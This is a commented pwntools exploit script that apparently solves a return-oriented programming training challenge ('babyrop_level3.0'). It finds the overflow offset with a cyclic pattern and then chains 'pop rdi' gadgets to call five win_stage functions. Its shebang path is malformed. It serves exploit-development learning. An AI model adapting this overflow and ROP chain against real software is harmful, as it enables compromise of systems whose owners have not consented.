#!user/bin/python3
from pwn import *

# Retrieve the ELF information from the binary
elf = ELF('/challenge/babyrop_level3.0')

# Initialize the ROP module
rop = ROP(elf)

# Run the program
io = elf.process(setuid=False)

# Build and send the payload to the program
# NOTE: cyclic function setup a pattern payload that with
#       cyclic_find can be used to retrieve the distance
#       between buffer and return address
io.sendline(cyclic(512, n=8))
io.wait()
buffer_length = cyclic_find(io.corefile.fault_addr, n=8)

# Run the program another time
io = elf.process()

# Initialize the "pop rdi ; ret" address
# NOTE: this gadget is used to set the first parameter of each function
gadget_addr = rop.rdi.address

# Build the payload in order to call the 5 different win_stage function with the
# correct parameter each time
PAYLOAD = b'A'*buffer_length +\
    p64(gadget_addr) + p64(1) + p64(elf.symbols.win_stage_1) +\
    p64(gadget_addr) + p64(2) + p64(elf.symbols.win_stage_2) +\
    p64(gadget_addr) + p64(3) + p64(elf.symbols.win_stage_3) +\
    p64(gadget_addr) + p64(4) + p64(elf.symbols.win_stage_4) +\
    p64(gadget_addr) + p64(5) + p64(elf.symbols.win_stage_5)
io.sendline(PAYLOAD)

# Print the output of the program
print(io.recvall().decode(errors='ignore'))